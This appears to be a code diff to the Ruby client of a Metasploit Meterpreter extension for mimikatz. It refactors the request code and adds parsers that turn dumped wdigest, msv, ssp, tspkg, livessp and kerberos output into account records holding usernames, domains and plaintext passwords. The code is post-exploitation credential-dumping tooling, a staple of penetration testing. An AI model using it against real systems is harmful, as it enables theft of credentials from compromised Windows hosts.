@@ -37,45 +37,77 @@ class Mimikatz < Extension
 	def mimikatz_send_request(method)
 		request = Packet.create_request(method)
 		response = client.send_request(request)
-		result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
+		return Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
+	end
 
+	def parse_mimikatz_result(result)
+                details = CSV.parse(result)
+                accounts  =  []
+                details.each do |acc|
+                        account = {
+                                :authid => acc[0],
+                                :package => acc[1],
+                                :user => acc[2],
+                                :domain => acc[3],
+                                :password => acc[4]
+                        }
+                        accounts << account
+                end
+                return accounts
+	end
+	
+	def parse_mimikatz_ssp_result(result)
 		details = CSV.parse(result)
-		accounts  =  []
+		accounts = []
 		details.each do |acc|
-			account = {
-				:authid => acc[0],
-				:package => acc[1],
-				:user => acc[2],
-				:domain => acc[3],
-				:password => acc[4]
-			}
-			accounts << account
+			ssps = acc[4].split(' }')
+			ssps.each do |ssp|
+				s_acc = ssp.split(' ; ')
+				user = s_acc[0].split('{ ')[1]
+				account = {
+					:authid => acc[0],
+					:package => acc[1],
+					:user => user,
+					:domain => s_acc[1],
+					:password => s_acc[2],
+					:orig_user => acc[2],
+					:orig_domain => acc[3]
+				}
+				accounts << account
+			end
 		end
+		p accounts
 		return accounts
 	end
 
 	def wdigest
-		mimikatz_send_request('mimikatz_wdigest')
+		result = mimikatz_send_request('mimikatz_wdigest')
+		return parse_mimikatz_result(result)
 	end
 
 	def msv
-		mimikatz_send_request('mimikatz_msv1_0')
+		result = mimikatz_send_request('mimikatz_msv1_0')
+                return parse_mimikatz_result(result)
 	end
 
 	def livessp
-		mimikatz_send_request('mimikatz_livessp')
+		result = mimikatz_send_request('mimikatz_livessp')
+                return parse_mimikatz_result(result)
 	end
 
 	def ssp
-		mimikatz_send_request('mimikatz_ssp')
+		result = mimikatz_send_request('mimikatz_ssp')
+                return parse_mimikatz_ssp_result(result)
 	end
 
 	def tspkg
-		mimikatz_send_request('mimikatz_tspkg')
+		result = mimikatz_send_request('mimikatz_tspkg')
+                return parse_mimikatz_result(result)
 	end
 
 	def kerberos
-		mimikatz_send_request('mimikatz_kerberos')
+		result = mimikatz_send_request('mimikatz_kerberos')
+                return parse_mimikatz_result(result)
 	end
 end
 
